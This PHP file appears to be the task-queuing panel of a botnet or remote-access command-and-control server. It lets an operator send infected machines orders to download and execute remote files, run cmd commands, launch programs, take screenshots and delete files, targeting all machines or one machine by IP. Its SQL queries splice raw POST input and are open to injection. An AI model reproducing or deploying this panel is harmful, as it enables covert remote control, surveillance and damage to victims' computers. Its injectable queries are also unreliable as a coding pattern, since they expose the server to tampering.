<?php
	include "include/settings.php";
	
	if(isset($_POST["pwd"])) {
		if($_POST["pwd"] == $admin) {}
		else {
			die;
		}
	} else {
		die;
	}
	
	$us_id = "all";
	
	if(isset($_POST["id"])) {
		
		$conn = new mysqli($host, $user, $pass, "controler");
	
		$sql = "SELECT COUNT(*) FROM `user` WHERE `id` = ".$_POST["id"];
		$result = $conn->query($sql);
		$row = $result->fetch_assoc();
		if ($row['COUNT(*)'] > 0) {
			$us_id = $_POST["id"];
			$conn->close();
		} else {
			$conn->close();
			die;
		}
	}
	
	if(isset($_POST["to"])) {
		
		$conn = new mysqli($host, $user, $pass, "controler");
		
		if($_POST["to"] == "all") {
			$sql = 'DELETE FROM `task_all`';
			$conn->query($sql);
			
			$sql = 'DELETE FROM `completed`';
			$conn->query($sql);
			
			$sql = 'INSERT INTO `task_all`(`task`, `value`) VALUES ("'.$_POST["tc"].'", "'.$_POST["content"].'")';
			$conn->query($sql);
			$conn->close();
		} else {
			$sql = "SELECT `ip` FROM `user` WHERE `id` = ".$_POST["to"];
			$result = $conn->query($sql);
			$row = $result->fetch_assoc();
			
			$sql = 'INSERT INTO `task_to`(`ip`, `task`, `value`) VALUES ("'.$row["ip"].'", "'.$_POST["tc"].'", "'.$_POST["content"].'")';
			$conn->query($sql);
			$conn->close();
		}
	}

?>

<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<style>
			body {
				padding: 10%;
			}
		
			input[type=text], select {
				text-align: center;
				width: 100%;
				padding: 12px 20px;
				margin: 8px 0;
				display: inline-block;
				border: 1px solid #ccc;
				border-radius: 4px;
				box-sizing: border-box;
			}
			input[type=submit] {
				width: 100%;
				background-color: #4CAF50;
				color: white;
				padding: 14px 20px;
				margin: 8px 0;
				border: none;
				border-radius: 4px;
				cursor: pointer;
			}
			input[type=submit]:hover {
				background-color: #45a049;
			}
			div {
				border-radius: 5px;
				background-color: #f2f2f2;
				padding: 20px;
			}
		</style>
		<title>Add new task</title>
	</head>
	<body>
		<div style="padding: 10%;">
			<form method="post">
			<input type="hidden" name="pwd" value="<?php echo $_POST["pwd"]; ?>">
				<input type="hidden" name="to" value="<?php echo $us_id; ?>">
				Select task type:
				<select name="tc">
					<option value="DaE">Download and Execute. Example: https://malware-kill.com/clear.exe</option>
					<option value="OpS">Open web-site. Example: https://encrypted.google.com</option>
					<option value="RcL">Run command in cmd. Example: ping 8.8.8.8</option>
					<option value="RlP">Run local program. Example: C:\Windows\regedit.exe</option>
					<option value="GsH">Get screenshot. Leave empty value.</option>
					<option value="JdF">Just download file to desktop. Example: https://malware-kill.com/clear.exe</option>
					<option value="del">Delete local file. Example: C:\Windows\regedit.exe</option>
				</select>
				<input type="text" name="content" placeholder="Set value">
				<button type="submit" style="background-color: #4CAF50; border: none; color: white; padding: 10px 22px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px;">Set</button>
			</form>
		</div>
	</body>
</html>